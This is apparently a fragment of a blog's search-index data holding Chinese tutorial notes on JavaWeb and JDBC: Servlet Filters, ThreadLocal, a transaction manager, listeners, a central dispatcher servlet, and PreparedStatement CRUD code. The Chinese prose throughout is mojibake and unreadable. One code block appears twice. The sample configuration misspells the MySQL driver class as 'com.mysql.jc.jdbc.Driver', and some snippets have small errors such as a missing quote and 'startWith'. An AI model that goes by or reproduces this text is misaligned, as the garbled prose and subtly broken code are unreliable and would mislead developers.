name=\u0026#34;fruitService\u0026#34; ref=\u0026#34;fruitService\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; 2.3 Filter Filterä¹Ÿå±äºServletè§„èŒƒ\nFilterå¼€å‘æ­¥éª¤ï¼šæ–°å»ºç±»å®ç°Filteræ¥å£ï¼Œç„¶åå®ç°å…¶ä¸­çš„ä¸‰ä¸ªæ–¹æ³•ï¼šinitã€doFilterã€destroy\né…ç½®Filterï¼Œå¯ä»¥ç”¨æ³¨è§£@WebFilterï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨xmlæ–‡ä»¶:\n1 \u0026lt;filter\u0026gt; \u0026lt;filter-mapping\u0026gt; Filteråœ¨é…ç½®æ—¶ï¼Œå’Œservletä¸€æ ·ï¼Œä¹Ÿå¯ä»¥é…ç½®é€šé…ç¬¦ï¼Œä¾‹å¦‚ @WebFilter(\u0026quot;*.do\u0026quot;)è¡¨ç¤ºæ‹¦æˆªæ‰€æœ‰ä»¥.doç»“å°¾çš„è¯·æ±‚\nè¿‡æ»¤å™¨é“¾\næ‰§è¡Œçš„é¡ºåºä¾æ¬¡æ˜¯ï¼š A B C demo03 C2 B2 A2 å¦‚æœé‡‡å–çš„æ˜¯æ³¨è§£çš„æ–¹å¼è¿›è¡Œé…ç½®ï¼Œé‚£ä¹ˆè¿‡æ»¤å™¨é“¾çš„æ‹¦æˆªé¡ºåºæ˜¯æŒ‰ç…§å…¨ç±»åçš„å…ˆåé¡ºåºæ’åºçš„ å¦‚æœé‡‡å–çš„æ˜¯xmlçš„æ–¹å¼è¿›è¡Œé…ç½®ï¼Œé‚£ä¹ˆæŒ‰ç…§é…ç½®çš„å…ˆåé¡ºåºè¿›è¡Œæ’åº æ¯”å¦‚å¯ä»¥å®ç°å€ŸåŠ©è¿‡æ»¤å™¨ï¼Œè®¾ç½®å…¨å±€çš„ç¼–ç æ–¹å¼ï¼Œå»ºå¥½ä»£ç å†—ä½™é‡ã€‚ 2.4 äº‹åŠ¡å¤„ç† ThreadLocal\nget() , set(obj)\nThreadLocalç§°ä¹‹ä¸ºæœ¬åœ°çº¿ç¨‹ ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡setæ–¹æ³•åœ¨å½“å‰çº¿ç¨‹ä¸Šå­˜å‚¨æ•°æ®ã€é€šè¿‡getæ–¹æ³•åœ¨å½“å‰çº¿ç¨‹ä¸Šè·å–æ•°æ®\nsetæ–¹æ³•æºç åˆ†æï¼š\n1 2 3 4 5 6 7 8 public void set(T value) { Thread t = Thread.currentThread(); //è·å–å½“å‰çš„çº¿ç¨‹ ThreadLocalMap map = getMap(t); //æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½ç»´æŠ¤å„è‡ªçš„ä¸€ä¸ªå®¹å™¨ï¼ˆThreadLocalMapï¼‰ if (map != null) map.set(this, value); //è¿™é‡Œçš„keyå¯¹åº”çš„æ˜¯ThreadLocalï¼Œå› ä¸ºæˆ‘ä»¬çš„ç»„ä»¶ä¸­éœ€è¦ä¼ è¾“ï¼ˆå…±äº«ï¼‰çš„å¯¹è±¡å¯èƒ½ä¼šæœ‰å¤šä¸ªï¼ˆä¸æ­¢Connectionï¼‰ else createMap(t, value); //é»˜è®¤æƒ…å†µä¸‹mapæ˜¯æ²¡æœ‰åˆå§‹åŒ–çš„ï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡å¾€å…¶ä¸­æ·»åŠ æ•°æ®æ—¶ï¼Œä¼šå»åˆå§‹åŒ– } getæ–¹æ³•æºç åˆ†æï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 public T get() { Thread t = Thread.currentThread(); //è·å–å½“å‰çš„çº¿ç¨‹ ThreadLocalMap map = getMap(t); //è·å–å’Œè¿™ä¸ªçº¿ç¨‹ï¼ˆä¼ä¸šï¼‰ç›¸å…³çš„ThreadLocalMapï¼ˆä¹Ÿå°±æ˜¯å·¥ä½œçº½å¸¦çš„é›†åˆï¼‰ if (map != null) { ThreadLocalMap.Entry e = map.getEntry(this); //thisæŒ‡çš„æ˜¯ThreadLocalå¯¹è±¡ï¼Œé€šè¿‡å®ƒæ‰èƒ½çŸ¥é“æ˜¯å“ªä¸€ä¸ªå·¥ä½œçº½å¸¦ if (e != null) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) T result = (T)e.value; //entry.valueå°±å¯ä»¥è·å–åˆ°å·¥å…·ç®±äº† return result; } } return setInitialValue(); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class TransactionManager { public TransactionManager() { } public static void beginTrans() throws SQLException { ConnUtil.getConn().setAutoCommit(false); } public static void commit() throws SQLException { Connection conn = ConnUtil.getConn(); conn.commit(); ConnUtil.closeConn(); } public static void rollback() throws SQLException { Connection conn = ConnUtil.getConn(); conn.rollback(); ConnUtil.closeConn(); } } å€ŸåŠ©sql.connection,å®ç°å¯¹æ•´ä¸ªäº‹åŠ¡çš„ç®¡ç†ï¼Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class TransactionManager { public TransactionManager() { } public static void beginTrans() throws SQLException { ConnUtil.getConn().setAutoCommit(false); } public static void commit() throws SQLException { Connection conn = ConnUtil.getConn(); conn.commit(); ConnUtil.closeConn(); } public static void rollback() throws SQLException { Connection conn = ConnUtil.getConn(); conn.rollback(); ConnUtil.closeConn(); } } 2.5 ç›‘å¬å™¨ ç›‘å¬äº‹ä»¶çš„è¿‡ç¨‹ ServletContextListener - ç›‘å¬ServletContextå¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯çš„è¿‡ç¨‹ HttpSessionListener - ç›‘å¬HttpSessionå¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯çš„è¿‡ç¨‹ ServletRequestListener - ç›‘å¬ServletRequestå¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯çš„è¿‡ç¨‹ ServletContextAttributeListener - ç›‘å¬ServletContextçš„ä¿å­˜ä½œç”¨åŸŸçš„æ”¹åŠ¨(add,remove,replace) HttpSessionAttributeListener - ç›‘å¬HttpSessionçš„ä¿å­˜ä½œç”¨åŸŸçš„æ”¹åŠ¨(add,remove,replace) ServletRequestAttributeListener - ç›‘å¬ServletRequestçš„ä¿å­˜ä½œç”¨åŸŸçš„æ”¹åŠ¨(add,remove,replace) HttpSessionBindingListener - ç›‘å¬æŸä¸ªå¯¹è±¡åœ¨SessionåŸŸä¸­çš„åˆ›å»ºä¸ç§»é™¤ HttpSessionActivationListener - ç›‘å¬æŸä¸ªå¯¹è±¡åœ¨SessionåŸŸä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ– 2.6 ä¸­å¤®æ§åˆ¶å™¨ DispatcherServletè¿™ä¸ªç±»çš„å·¥ä½œåˆ†ä¸ºä¸¤å¤§éƒ¨åˆ†ï¼š\næ ¹æ®urlå®šä½åˆ°èƒ½å¤Ÿå¤„ç†è¿™ä¸ªè¯·æ±‚çš„controllerç»„ä»¶ï¼š\nä»urlä¸­æå–servletPath : å°†è·å¾—çš„urlè¿›è¡Œå¤„ç†ï¼Œè·å¾—æˆ‘ä»¬åœ¨beanFactoryä¸­ç»„è£…å¥½çš„Controllerå¯¹è±¡åç§°ã€‚\næ ¹æ®åç§°æ‰¾åˆ°å¯¹åº”çš„ç»„ä»¶:xxxController ï¼Œ è¿™ä¸ªå¯¹åº”çš„ä¾æ®æˆ‘ä»¬å­˜å‚¨åœ¨applicationContext.xmlä¸­\n1 \u0026lt;bean id=\u0026#34;fruit\u0026#34; class=\u0026#34;com.atguigu.fruit.controllers.FruitController/\u0026gt; é€šè¿‡DOMæŠ€æœ¯æˆ‘ä»¬å»è§£æXMLæ–‡ä»¶ï¼Œåœ¨ä¸­å¤®æ§åˆ¶å™¨ä¸­å½¢æˆä¸€ä¸ªbeanMapå®¹å™¨ï¼Œç”¨æ¥å­˜æ”¾æ‰€æœ‰çš„Controllerç»„ä»¶\næ ¹æ®è·å–åˆ°çš„operateçš„å€¼å®šä½åˆ°æˆ‘ä»¬FruitControllerä¸­éœ€è¦è°ƒç”¨çš„æ–¹æ³•\nè°ƒç”¨Controllerç»„ä»¶ä¸­çš„æ–¹æ³•ï¼š\nè·å–å‚æ•°\nè·å–å³å°†è¦è°ƒç”¨çš„æ–¹æ³•çš„å‚æ•°ç­¾åä¿¡æ¯: Parameter[] parameters = method.getParameters();\né€šè¿‡parameter.getName()è·å–å‚æ•°çš„åç§°ï¼›\nå‡†å¤‡äº†Object[] parameterValues è¿™ä¸ªæ•°ç»„ç”¨æ¥å­˜æ”¾å¯¹åº”å‚æ•°çš„å‚æ•°å€¼ å¦å¤–ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘å‚æ•°çš„ç±»å‹é—®é¢˜ï¼Œéœ€è¦åšç±»å‹è½¬åŒ–çš„å·¥ä½œã€‚é€šè¿‡parameter.getType()è·å–å‚æ•°çš„ç±»å‹\næ‰§è¡Œæ–¹æ³• Object returnObj = method.invoke(controllerBean , parameterValues);\nè§†å›¾å¤„ç†\n1 2 3 4 String returnStr = (String)returnObj; if(returnStr.startWith(\u0026#34;redirect:\u0026#34;)){ .... }else if..... è¿™é‡Œç»™å‡ºapplicationContext.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE beans[ \u0026lt;!ELEMENT beans (bean*)\u0026gt; \u0026lt;!ELEMENT bean (property*)\u0026gt; \u0026lt;!ELEMENT property (#PCDATA)\u0026gt; \u0026lt;!ATTLIST bean id ID #REQUIRED\u0026gt; \u0026lt;!ATTLIST bean class CDATA #IMPLIED\u0026gt; \u0026lt;!ATTLIST property name CDATA #IMPLIED\u0026gt; \u0026lt;!ATTLIST property ref IDREF #IMPLIED\u0026gt; ]\u0026gt; \u0026lt;!-- ä¸Šé¢çš„æ˜¯ è¦æ±‚äº†\u0026lt;bean \u0026gt; å’Œ \u0026lt;property\u0026gt; çš„æ ¼å¼--\u0026gt; \u0026lt;beans\u0026gt; \u0026lt;bean id = \u0026#34;userBasicDAO\u0026#34; class = \u0026#34;com.reus.qqzone.dao.impl.UserBasicDAOImpl\u0026#34;/\u0026gt; \u0026lt;bean id = \u0026#34;userBasicService\u0026#34; class = \u0026#34;com.reus.qqzone.service.impl.UserBasicServiceImpl\u0026#34;\u0026gt; \u0026lt;property name = \u0026#34;userBasicDAO\u0026#34; ref=\u0026#34;userBasicDAO\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;!-- user.do --\u0026gt; \u0026lt;bean id = \u0026#34;user\u0026#34; class =\u0026#34;com.reus.qqzone.controller.UserController\u0026#34;\u0026gt; \u0026lt;property name = \u0026#34;userBasicService\u0026#34; ref = \u0026#34;userBasicService\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 0x03 ä¸šåŠ¡ è®¾è®¡ä¸šåŠ¡çš„æ—¶å€™ï¼Œéœ€è¦å…ˆæ„æƒ³å¥½æ•°æ®åº“ã€åŠæ•°æ®åº“ä¹‹é—´çš„ä¾èµ–å…³ç³»ã€‚\nDAOçš„æ¦‚å¿µå’Œè§’è‰²ï¼ˆè®¾è®¡ç†å¿µï¼‰ï¼š DAO-ç§°ä¹‹ä¸ºæ•°æ®è®¿é—®å¯¹è±¡ï¼Œå…¶ä¸­çš„æ–¹æ³•éƒ½æ˜¯å•ç²¾åº¦æ–¹æ³•ã€‚\nä»€ä¹ˆå«å•ç²¾åº¦ï¼Œå•ç²¾åº¦æŒ‡çš„æ˜¯è¿™ä¸ªæ–¹æ³•çš„ç²’åº¦ä¸èƒ½å†åˆ†äº†ï¼Œå·²ç»éå¸¸ç»†äº†ï¼ˆå› æ­¤ä¹Ÿç§°ä¹‹ä¸ºç»†ç²’åº¦ï¼‰ ä»€ä¹ˆæ˜¯ä¸šåŠ¡å±‚\nModel1å’ŒModel2 MVC : Modelï¼ˆæ¨¡å‹ï¼‰ã€Viewï¼ˆè§†å›¾ï¼‰ã€Controllerï¼ˆæ§åˆ¶å™¨ï¼‰ è§†å›¾å±‚ï¼šç”¨äºåšæ•°æ®å±•ç¤ºä»¥åŠå’Œç”¨æˆ·äº¤äº’çš„ä¸€ä¸ªç•Œé¢ æ§åˆ¶å±‚ï¼šèƒ½å¤Ÿæ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå…·ä½“çš„ä¸šåŠ¡åŠŸèƒ½è¿˜æ˜¯éœ€è¦å€ŸåŠ©äºæ¨¡å‹ç»„ä»¶æ¥å®Œæˆ æ¨¡å‹å±‚ï¼šæ¨¡å‹åˆ†ä¸ºå¾ˆå¤šç§ï¼šæœ‰æ¯”è¾ƒç®€å•çš„pojo/vo(value object)ï¼Œæœ‰ä¸šåŠ¡æ¨¡å‹ç»„ä»¶ï¼Œæœ‰æ•°æ®è®¿é—®å±‚ç»„ä»¶ pojo/vo :ç±»å¯¹è±¡ DAO ï¼š æ•°æ®è®¿é—®å¯¹è±¡ BO ï¼š ä¸šåŠ¡å¯¹è±¡(è¿™é‡Œå³ä¸ºService) åŒºåˆ†ä¸šåŠ¡å¯¹è±¡å’Œæ•°æ®è®¿é—®å¯¹è±¡ï¼š DAOä¸­çš„æ–¹æ³•éƒ½æ˜¯å•ç²¾åº¦æ–¹æ³•æˆ–è€…ç§°ä¹‹ä¸ºç»†ç²’åº¦æ–¹æ³•ã€‚ä»€ä¹ˆå«å•ç²¾åº¦ï¼Ÿä¸€ä¸ªæ–¹æ³•åªè€ƒè™‘ä¸€ä¸ªæ“ä½œï¼Œæ¯”å¦‚å¢åˆ æ”¹æŸ¥ BOä¸­çš„æ–¹æ³•å±äºä¸šåŠ¡æ–¹æ³•ï¼Œä¹Ÿå®é™…çš„ä¸šåŠ¡æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œå› æ­¤ä¸šåŠ¡æ–¹æ³•çš„ç²’åº¦æ˜¯æ¯”è¾ƒç²—çš„ é’ˆå¯¹ä¸€ä¸ªç”¨æˆ·çš„æ“ä½œï¼šæˆ‘ä»¬å¯ä»¥å¯¹ç”¨æˆ·çš„ç™»å½•ã€æ³¨å†Œã€æŸ¥çœ‹ä¸ªäººä¿¡æ¯ã€æ³¨é”€ã€æ›´æ”¹ä¿¡æ¯ï¼Œè¿™äº›è¦æ±‚é›†åˆæˆä¸€ä¸ªcontroller\ncontrollerä¸­è°ƒç”¨service å±‚ï¼Œåœ¨serviceå±‚å®ç°ç™»å½•ã€æ³¨å†Œç­‰çš„ä¸šåŠ¡ã€‚ åŒæ—¶å‘¢ï¼Œserviceå€Ÿç”¨daoå±‚çš„åŸºç¡€æ•°æ®åº“ä¸ºåº•å±‚ã€‚ ","permalink":"http://www.reus09.top/posts/tech/javaweb/","summary":"0x01 Tomcatä½¿ç”¨ 1.1 Tomcatè®¾ç½®ç¼–ç  Tomcatè®¾ç½®ç¼–ç  tomcat8ä¹‹å‰ï¼Œè®¾ç½®ç¼–ç ï¼š getè¯·æ±‚æ–¹å¼ï¼š getæ–¹å¼ç›®å‰ä¸éœ€è¦è®¾ç½®ç¼–ç ï¼ˆåŸºäº","title":"Javaweb"},{"content":"ä¸€ï¼šJDBCæ¦‚è¿° 1.1 æ•°æ®çš„æŒä¹…åŒ– æŒä¹…åŒ–(persistence)ï¼šæŠŠæ•°æ®ä¿å­˜åˆ°å¯æ‰ç”µå¼å­˜å‚¨è®¾å¤‡ä¸­ä»¥ä¾›ä¹‹åä½¿ç”¨ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç‰¹åˆ«æ˜¯ä¼ä¸šçº§åº”ç”¨ï¼Œæ•°æ®æŒä¹…åŒ–æ„å‘³ç€å°†å†…å­˜ä¸­çš„æ•°æ®ä¿å­˜åˆ°ç¡¬ç›˜ä¸ŠåŠ ä»¥â€å›ºåŒ–â€ï¼Œè€ŒæŒä¹…åŒ–çš„å®ç°è¿‡ç¨‹å¤§å¤šé€šè¿‡å„ç§å…³ç³»æ•°æ®åº“æ¥å®Œæˆã€‚\næŒä¹…åŒ–çš„ä¸»è¦åº”ç”¨æ˜¯å°†å†…å­˜ä¸­çš„æ•°æ®å­˜å‚¨åœ¨å…³ç³»å‹æ•°æ®åº“ä¸­ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å­˜å‚¨åœ¨ç£ç›˜æ–‡ä»¶ã€XMLæ•°æ®æ–‡ä»¶ä¸­ã€‚\n1.2 JDBCç¨‹åºç¼–å†™æ­¥éª¤ æ€»ç»“ä¸€ä¸‹JDBCå»ºç«‹è¿æ¥çš„å…¨è¿‡ç¨‹ã€‚ äºŒï¼šè·å–æ•°æ®åº“è¿æ¥ 2.1 Driveræ¥å£å®ç°ç±» 2.1.1 Driveræ¥å£ä»‹ç» java.sql.Driver æ¥å£æ˜¯æ‰€æœ‰ JDBC é©±åŠ¨ç¨‹åºéœ€è¦å®ç°çš„æ¥å£ã€‚è¿™ä¸ªæ¥å£æ˜¯æä¾›ç»™æ•°æ®åº“å‚å•†ä½¿ç”¨çš„ï¼Œä¸åŒæ•°æ®åº“å‚å•†æä¾›ä¸åŒçš„å®ç°ã€‚\nåœ¨ç¨‹åºä¸­ä¸éœ€è¦ç›´æ¥å»è®¿é—®å®ç°äº† Driver æ¥å£çš„ç±»ï¼Œè€Œæ˜¯ç”±é©±åŠ¨ç¨‹åºç®¡ç†å™¨ç±»(java.sql.DriverManager)å»è°ƒç”¨è¿™äº›Driverå®ç°ã€‚\nmySqlçš„é©±åŠ¨ï¼šcom.mysql.cj.jdbc.Driver ,æœ€æ–°ç‰ˆçš„é©±åŠ¨å·²æ›´åä¸ºæ­¤ã€‚ è¿™é‡Œè®²ä¸€ä¸‹IDEA å¦‚ä½•å¯¼å…¥mysqlè¿æ¥åº“\næ‰“å¼€Project Structureæ¨¡å—\nç„¶åæŒ‰ç…§å¦‚å›¾æ‰€ç¤ºç‚¹å‡»ï¼Œå³å¯æ·»åŠ jaråŒ…åˆ°é¡¹ç›®è·¯å¾„\n2.1.2 åŠ è½½ä¸æ³¨å†ŒJDBCé©±åŠ¨ åŠ è½½é©±åŠ¨ï¼šåŠ è½½ JDBC é©±åŠ¨éœ€è°ƒç”¨ Class ç±»çš„é™æ€æ–¹æ³• forName()ï¼Œå‘å…¶ä¼ é€’è¦åŠ è½½çš„ JDBC é©±åŠ¨çš„ç±»å\nClass.forName(â€œcom.mysql.cj.jdbc.Driverâ€); æ³¨å†Œé©±åŠ¨ï¼šDriverManager ç±»æ˜¯é©±åŠ¨ç¨‹åºç®¡ç†å™¨ç±»ï¼Œè´Ÿè´£ç®¡ç†é©±åŠ¨ç¨‹åº\nä½¿ç”¨DriverManager.registerDriver(com.mysql.jc.jdbc.Driver)æ¥æ³¨å†Œé©±åŠ¨\né€šå¸¸ä¸ç”¨æ˜¾å¼è°ƒç”¨ DriverManager ç±»çš„ registerDriver() æ–¹æ³•æ¥æ³¨å†Œé©±åŠ¨ç¨‹åºç±»çš„å®ä¾‹ï¼Œå› ä¸º Driver æ¥å£çš„é©±åŠ¨ç¨‹åºç±»éƒ½åŒ…å«äº†é™æ€ä»£ç å—ï¼Œåœ¨è¿™ä¸ªé™æ€ä»£ç å—ä¸­ï¼Œä¼šè°ƒç”¨ DriverManager.registerDriver() æ–¹æ³•æ¥æ³¨å†Œè‡ªèº«çš„ä¸€ä¸ªå®ä¾‹ã€‚ä¸‹å›¾æ˜¯MySQLçš„Driverå®ç°ç±»çš„æºç ï¼š\n2.2 URL JDBC URL ç”¨äºæ ‡è¯†ä¸€ä¸ªè¢«æ³¨å†Œçš„é©±åŠ¨ç¨‹åºï¼Œé©±åŠ¨ç¨‹åºç®¡ç†å™¨é€šè¿‡è¿™ä¸ª URL é€‰æ‹©æ­£ç¡®çš„é©±åŠ¨ç¨‹åºï¼Œä»è€Œå»ºç«‹åˆ°æ•°æ®åº“çš„è¿æ¥ã€‚\nä¸¾ä¾‹ï¼š\nè¿™é‡Œæ³¨æ˜ï¼šåœ¨MySQL 8ç‰ˆæœ¬ä»¥ä¸Šçš„urlè¿æ¥éœ€è¦åŠ ä¸Šæ—¶åŒº\njdbc:mysql://localhost:3306/test?serverTimezone=UTC\n2.4 æ•°æ®åº“è¿æ¥æ–¹å¼ è¿æ¥æ–¹å¼äº” 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @Test public void testConnection5() throws Exception { //1.åŠ è½½é…ç½®æ–‡ä»¶ InputStream is = ConnectionTest.class.getClassLoader().getResourceAsStream(\u0026#34;jdbc.properties\u0026#34;); Properties pros = new Properties(); pros.load(is); //2.è¯»å–é…ç½®ä¿¡æ¯ String user = pros.getProperty(\u0026#34;user\u0026#34;); String password = pros.getProperty(\u0026#34;password\u0026#34;); String url = pros.getProperty(\u0026#34;url\u0026#34;); String driverClass = pros.getProperty(\u0026#34;driverClass\u0026#34;); //3.åŠ è½½é©±åŠ¨ Class.forName(driverClass); //4.è·å–è¿æ¥ Connection conn = DriverManager.getConnection(url,user,password); System.out.println(conn); } å…¶ä¸­ï¼Œé…ç½®æ–‡ä»¶å£°æ˜åœ¨å·¥ç¨‹çš„srcç›®å½•ä¸‹ï¼šjdbc.properties\n1 2 3 4 user=root password=abc123 url=jdbc:mysql://localhost:3306/test?serverTimezone=UTC driverClass=com.mysql.jc.jdbc.Driver è¯´æ˜ï¼šä½¿ç”¨é…ç½®æ–‡ä»¶çš„æ–¹å¼ä¿å­˜é…ç½®ä¿¡æ¯ï¼Œåœ¨ä»£ç ä¸­åŠ è½½é…ç½®æ–‡ä»¶\nä½¿ç”¨é…ç½®æ–‡ä»¶çš„å¥½å¤„ï¼š\nâ‘ å®ç°äº†ä»£ç å’Œæ•°æ®çš„åˆ†ç¦»ï¼Œå¦‚æœéœ€è¦ä¿®æ”¹é…ç½®ä¿¡æ¯ï¼Œç›´æ¥åœ¨é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ï¼Œä¸éœ€è¦æ·±å…¥ä»£ç  â‘¡å¦‚æœä¿®æ”¹äº†é…ç½®ä¿¡æ¯ï¼Œçœå»é‡æ–°ç¼–è¯‘çš„è¿‡ç¨‹ã€‚\nä¸‰ï¼šä½¿ç”¨PreparedStatementå®ç°CRUDæ“ä½œ 3.1 æ“ä½œå’Œè®¿é—®æ•°æ®åº“ æ•°æ®åº“è¿æ¥è¢«ç”¨äºå‘æ•°æ®åº“æœåŠ¡å™¨å‘é€å‘½ä»¤å’Œ SQL è¯­å¥ï¼Œå¹¶æ¥å—æ•°æ®åº“æœåŠ¡å™¨è¿”å›çš„ç»“æœã€‚å…¶å®ä¸€ä¸ªæ•°æ®åº“è¿æ¥å°±æ˜¯ä¸€ä¸ªSocketè¿æ¥ã€‚\nåœ¨ java.sql åŒ…ä¸­æœ‰ 3 ä¸ªæ¥å£åˆ†åˆ«å®šä¹‰äº†å¯¹æ•°æ®åº“çš„è°ƒç”¨çš„ä¸åŒæ–¹å¼ï¼š\nStatementï¼šç”¨äºæ‰§è¡Œé™æ€ SQL è¯­å¥å¹¶è¿”å›å®ƒæ‰€ç”Ÿæˆç»“æœçš„å¯¹è±¡ã€‚ PrepatedStatementï¼šSQL è¯­å¥è¢«é¢„ç¼–è¯‘å¹¶å­˜å‚¨åœ¨æ­¤å¯¹è±¡ä¸­ï¼Œå¯ä»¥ä½¿ç”¨æ­¤å¯¹è±¡å¤šæ¬¡é«˜æ•ˆåœ°æ‰§è¡Œè¯¥è¯­å¥ã€‚ CallableStatementï¼šç”¨äºæ‰§è¡Œ SQL å­˜å‚¨è¿‡ç¨‹ å¯¹äº Java è€Œè¨€ï¼Œè¦é˜²èŒƒ SQL æ³¨å…¥ï¼Œåªè¦ç”¨ PreparedStatement(ä»Statementæ‰©å±•è€Œæ¥) å–ä»£ Statement å°±å¯ä»¥äº†ã€‚\n3.2 PreparedStatementçš„ä½¿ç”¨ 3.2.1 PreparedStatementä»‹ç» PreparedStatement æ¥å£æ˜¯ Statement çš„å­æ¥å£ï¼Œå®ƒè¡¨ç¤ºä¸€æ¡é¢„ç¼–è¯‘è¿‡çš„ SQL è¯­å¥\nPreparedStatement å¯¹è±¡æ‰€ä»£è¡¨çš„ SQL è¯­å¥ä¸­çš„å‚æ•°ç”¨é—®å·(?)æ¥è¡¨ç¤ºï¼Œè°ƒç”¨ PreparedStatement å¯¹è±¡çš„ setXxx() æ–¹æ³•æ¥è®¾ç½®è¿™äº›å‚æ•°. setXxx() æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦è®¾ç½®çš„ SQL è¯­å¥ä¸­çš„å‚æ•°çš„ç´¢å¼•(ä» 1 å¼€å§‹)ï¼Œç¬¬äºŒä¸ªæ˜¯è®¾ç½®çš„ SQL è¯­å¥ä¸­çš„å‚æ•°çš„å€¼\n3.2.2 PreparedStatement vs Statement ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚\nPreparedStatement èƒ½æœ€å¤§å¯èƒ½æé«˜æ€§èƒ½ï¼š\nDBServerä¼šå¯¹é¢„ç¼–è¯‘è¯­å¥æä¾›æ€§èƒ½ä¼˜åŒ–ã€‚å› ä¸ºé¢„ç¼–è¯‘è¯­å¥æœ‰å¯èƒ½è¢«é‡å¤è°ƒç”¨ï¼Œæ‰€ä»¥è¯­å¥åœ¨è¢«DBServerçš„ç¼–è¯‘å™¨ç¼–è¯‘åçš„æ‰§è¡Œä»£ç è¢«ç¼“å­˜ä¸‹æ¥ï¼Œé‚£ä¹ˆä¸‹æ¬¡è°ƒç”¨æ—¶åªè¦æ˜¯ç›¸åŒçš„é¢„ç¼–è¯‘è¯­å¥å°±ä¸éœ€è¦ç¼–è¯‘ï¼Œåªè¦å°†å‚æ•°ç›´æ¥ä¼ å…¥ç¼–è¯‘è¿‡çš„è¯­å¥æ‰§è¡Œä»£ç ä¸­å°±ä¼šå¾—åˆ°æ‰§è¡Œã€‚ åœ¨statementè¯­å¥ä¸­,å³ä½¿æ˜¯ç›¸åŒæ“ä½œä½†å› ä¸ºæ•°æ®å†…å®¹ä¸ä¸€æ ·,æ‰€ä»¥æ•´ä¸ªè¯­å¥æœ¬èº«ä¸èƒ½åŒ¹é…,æ²¡æœ‰ç¼“å­˜è¯­å¥çš„æ„ä¹‰.äº‹å®æ˜¯æ²¡æœ‰æ•°æ®åº“ä¼šå¯¹æ™®é€šè¯­å¥ç¼–è¯‘åçš„æ‰§è¡Œä»£ç ç¼“å­˜ã€‚è¿™æ ·æ¯æ‰§è¡Œä¸€æ¬¡éƒ½è¦å¯¹ä¼ å…¥çš„è¯­å¥ç¼–è¯‘ä¸€æ¬¡ã€‚ (è¯­æ³•æ£€æŸ¥ï¼Œè¯­ä¹‰æ£€æŸ¥ï¼Œç¿»è¯‘æˆäºŒè¿›åˆ¶å‘½ä»¤ï¼Œç¼“å­˜) å¯¹äº Java è€Œè¨€ï¼Œè¦é˜²èŒƒ SQL æ³¨å…¥ï¼Œåªè¦ç”¨ PreparedStatement(ä»Statementæ‰©å±•è€Œæ¥) å–ä»£ Statement å°±å¯ä»¥äº†ã€‚\n3.2.3 Javaä¸SQLå¯¹åº”æ•°æ®ç±»å‹è½¬æ¢è¡¨ Javaç±»å‹ SQLç±»å‹ boolean BIT byte TINYINT short SMALLINT int INTEGER long BIGINT String CHAR,VARCHAR,LONGVARCHAR byte array BINARY , VAR BINARY java.sql.Date DATE java.sql.Time TIME java.sql.Timestamp TIMESTAMP 3.2.4 ä½¿ç”¨PreparedStatementå®ç°å¢ã€åˆ ã€æ”¹æ“ä½œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 //é€šç”¨çš„å¢ã€åˆ ã€æ”¹æ“ä½œï¼ˆä½“ç°ä¸€ï¼šå¢ã€åˆ ã€æ”¹ ï¼› ä½“ç°äºŒï¼šé’ˆå¯¹äºä¸åŒçš„è¡¨ï¼‰ public void update(String sql,Object ... args){ Connection conn = null; PreparedStatement ps = null; try { //1.è·å–æ•°æ®åº“çš„è¿æ¥ conn = JDBCUtils.getConnection(); //2.è·å–PreparedStatementçš„å®ä¾‹ (æˆ–ï¼šé¢„ç¼–è¯‘sqlè¯­å¥) ps = conn.prepareStatement(sql); //3.å¡«å……å ä½ç¬¦ for(int i = 0;i \u0026lt; args.length;i++){ ps.setObject(i + 1, args[i]); } //4.æ‰§è¡Œsqlè¯­å¥ ps.execute(); } catch (Exception e) { e.printStackTrace(); }finally{ //5.å…³é—­èµ„æº JDBCUtils.closeResource(conn, ps); } } 3.2.5 ä½¿ç”¨PreparedStatementå®ç°æŸ¥è¯¢æ“ä½œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 // é€šç”¨çš„é’ˆå¯¹äºä¸åŒè¡¨çš„æŸ¥è¯¢:è¿”å›ä¸€ä¸ªå¯¹è±¡ (version 1.0) public \u0026lt;T\u0026gt; T getInstance(Class\u0026lt;T\u0026gt; clazz, String sql, Object... args) { Connection conn = null; PreparedStatement ps = null; ResultSet rs = null; try { // 1.è·å–æ•°æ®åº“è¿æ¥ conn = JDBCUtils.getConnection(); // 2.é¢„ç¼–è¯‘sqlè¯­å¥ï¼Œå¾—åˆ°PreparedStatementå¯¹è±¡ ps = conn.prepareStatement(sql); // 3.å¡«å……å 